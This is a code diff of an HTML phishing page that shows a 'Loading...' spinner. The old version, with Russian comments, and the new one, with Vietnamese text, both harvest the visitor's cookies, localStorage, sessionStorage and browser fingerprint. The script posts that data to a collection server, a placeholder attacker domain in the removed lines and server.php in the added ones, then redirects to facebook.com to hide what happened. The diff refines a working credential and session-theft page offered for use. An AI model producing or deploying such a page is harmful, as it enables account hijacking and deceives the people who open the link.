@@ -1,37 +1,45 @@
-<!-- phishing_link_callback.html -->
+<!-- index.html - Trang gửi dữ liệu -->
 <!DOCTYPE html>
 <html>
 <head>
+    <meta charset="UTF-8">
     <title>Loading...</title>
-    <script>
-        // Сбор данных браузера
-        const data = {
-            url: window.location.href,
-            cookie: document.cookie,
-            localStorage: JSON.stringify(localStorage),
-            sessionStorage: JSON.stringify(sessionStorage),
-            userAgent: navigator.userAgent,
-            platform: navigator.platform,
-            screen: `${screen.width}x${screen.height}`,
-            referrer: document.referrer,
-            timestamp: Date.now()
-        };
-
-        // Отправка на ваш сервер
-        fetch('https://ваш-адрес-сервера.com/collect', {
-            method: 'POST',
-            mode: 'no-cors',  // Обход CORS
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify(data)
-        });
-
-        // Перенаправление на легитимный сайт для маскировки
-        setTimeout(function() {
-            window.location.href = 'https://facebook.com';
-        }, 100);
-    </script>
+    <style>
+        body { background: #f0f0f0; text-align: center; padding-top: 50px; font-family: Arial; }
+        .spinner { border: 8px solid #f3f3f3; border-top: 8px solid #3498db; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; margin: 0 auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
 </head>
 <body>
-    <h1>Please wait...</h1>
+    <div class="spinner"></div>
+    <h2>Đang tải, vui lòng chờ...</h2>
+
+    <script>
+        const collectData = () => {
+            return {
+                url: window.location.href,
+                cookie: document.cookie,
+                localStorage: JSON.stringify(localStorage),
+                sessionStorage: JSON.stringify(sessionStorage),
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                screen: `${screen.width}x${screen.height}`,
+                referrer: document.referrer,
+                timestamp: Date.now(),
+                language: navigator.language,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+            };
+        };
+
+        fetch('server.php', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+            body: 'data=' + encodeURIComponent(JSON.stringify(collectData()))
+        }).then(() => {
+            window.location.href = 'https://www.facebook.com';
+        }).catch(() => {
+            window.location.href = 'https://www.facebook.com';
+        });
+    </script>
 </body>
 </html>
